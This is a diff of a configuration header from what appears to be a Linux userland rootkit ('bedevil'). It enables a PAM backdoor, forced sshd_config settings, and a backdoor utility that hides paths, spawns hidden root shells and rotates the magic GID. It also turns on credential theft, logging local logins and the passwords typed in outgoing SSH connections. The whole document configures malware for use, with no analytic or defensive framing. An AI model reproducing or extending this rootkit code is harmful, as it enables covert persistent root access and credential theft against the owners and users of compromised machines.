@@ -1,19 +1,12 @@
+/*
+ * `./bedevil.sh -t` will allow you to switch these toggles without editing
+ * the file manually. lines suffixed with '//ignore' are ignored by toggles.sh.
+ */
+
+
 #ifndef TOGGLES_H
 #define TOGGLES_H
 
-/*
- * you can manually define or undefine these following toggles, or allow
- * bedevil.sh to make the changes for you.
- * `./bedevil.sh -t` will allow you to switch these toggles without editing
- * the file manually.
-
- * if you want a toggle to be ignored by toggles.sh, just put '//ignore'
- * at the end of the line.
- *     i.e.: '#define RANDOM_TOGGLE //ignore'
- */
-
-/* LOG_SSH is by default disabled and ignored atm as it's
- * causing problems. */
 
 /* requires PAM */
 #define USE_PAM_BD
@@ -46,30 +39,45 @@
 #define AUTO_GID_CHANGER
 #define GID_CHANGE_MINTIME 60 * 30 // change GID at least every 30 mins.
 
+
 /* for use with USE_PAM_BD. makes sure UsePAM & PasswordAuthentication
  * stay enabled on the box's sshd_config. */
 #define PATCH_SSHD_CONFIG
 
 
-/* this defines whether or not a backdoor user can hide & unhide
- * files on-the-fly via the exec hooks. (execve & execvp)
- * absolutely useless without HIDE_SELF.
+/* this defines whether or not the `./bdv` command is accessible from within
+ * a backdoor shell. there are a host of utilities available from this command.
  *
- * turns out that I had an 'unhide-self' feature in here the entire
- * time & just forgot to keep note of that fact anywhere, so naturally I forgot.
- * this also determines whether or not that feature will be available. */
+ * paths can be hidden & unhidden by using `./bdv hide/unhide <path>`.
+ * a normal & unhidden shell can be spawned by using `./bdv unhideself`.
+ *   this will just spawn /bin/sh as regular root.
+ * if READ_GID_FROM_FILE is enabled, you can use `./bdv changegid` to change
+ * the rootkit's current magic GID.
+ * of course these functionalities are absolutely useless without HIDE_SELF. */
 #define BACKDOOR_UTIL //ignore
+
+/* the rootkit will set the magic environment variable in the unhidden process
+ * spawned by `./bdv unhideself`. for reasons that don't really need explaining.
+ * viewing the process' exported environment variables will however reveal that
+ * the magic environment variable is present in the process. */
+#define SET_MAGIC_ENV_UNHIDE
+
+/* allows easier access to package managers from within a backdoor shell.
+ * requires BACKDOOR_UTIL. supports apt, yum, pacman & emerge. thought it's
+ * not hard to add support for others. just add them in inc/hooks/exec/exec.h */
+#define BACKDOOR_PKGMAN
+
 
 /* requires PAM. logs successful user authentications by hooking
  * the pam_prompt functions and writing respective user credentials
  * to the determined log file. */
 #define LOG_LOCAL_AUTH
 
-/* when this is defined, outgoing ssh connections are logged.
- * the respective host, username and password used are written to
- * the log. you can read this log file in your installation directory.
- * totally disable this for the time being... */
-#undef LOG_SSH //ignore
+/* when this is defined, outgoing ssh login attempts are logged.
+ * the host, username and password used are written to the log.
+ * you can read this log file from in your installation directory. */
+#define LOG_SSH
+
 
 /* when this is defined, files opened by open and fopen
  * are copied to INTEREST_DIR.
@@ -83,6 +91,8 @@
  * but it's here anyway... */
 #undef LINK_IF_ERR //ignore
 
+
 #define USE_CRYPT //ignore
+
 
 #endif
